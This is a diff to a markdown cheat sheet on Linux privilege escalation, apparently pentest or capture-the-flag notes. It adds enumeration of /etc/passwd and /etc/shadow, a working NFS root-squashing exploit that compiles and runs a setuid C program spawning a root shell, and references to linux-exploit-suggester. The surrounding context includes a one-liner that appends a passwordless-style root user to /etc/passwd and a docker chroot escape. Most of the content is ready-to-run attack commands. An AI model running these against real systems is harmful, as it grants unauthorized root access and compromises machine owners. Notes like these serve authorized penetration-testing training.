@@ -1,5 +1,4 @@
 ## Linux Privilege Escalation
-
 ### Enumeration
 -> Get system distribution and version
 ```
@@ -96,10 +95,12 @@ cat /etc/sudoers
 -> Exploitation  
 https://gtfobins.github.io/
 
-### Passwd Writabble [PrivEsc]
+### Weak File Permissions / Passwd Writabble [PrivEsc]
 -> Enumeration  
 ```
 ls -la /etc/passwd
+ls -la /etc/shadow
+
 ```
 -> Exploitation  
 ```
@@ -107,6 +108,39 @@ echo "okays:$(openssl passwd okay2):0:0:root:/root:/usr/bin/bash" >> /etc/passwd
 ```
 
 ### NFS Root Squashing
+-> Detection - VM Owned
+``` 
+cat /etc/exports
+```
+
+-> Viewing nfs directories with access - Attacker VM
+```
+showmount -e <ip>
+```
+
+-> Get nfs version - Attacker VM
+```
+rpcinfo <ip>
+```
+
+-> Mount - Attacker VM
+```
+mkdir /tmp/1
+mount -o rw,vers=2 <ip>:/<nfs_directory> /tmp/1
+```
+
+-> Creating and compiling file for privesc - Attacker VM
+```
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
+gcc /tmp/1/x.c -o /tmp/1/x
+chmod +s /tmp/1/x
+```
+
+-> Exploitation - VM Owned
+```
+/tmp/x
+ id
+```
 
 ### sudo < v1.28 - @sickrov [PrivEsc]
 ```
@@ -134,6 +168,16 @@ docker run -it -v /:/host/ <image>:<tag> chroot /host/ bash
 ./linpeas.sh
 ```
 https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
+
+-> linux-exploit-suggester
+```
+./linux-exploit-suggester.sh
+```
+or  
+```
+./linux-exploit-suiggester.sh --uname <uname-string>
+```
+https://github.com/The-Z-Labs/linux-exploit-suggester
 
 -> Unix Privesc Check
 ```
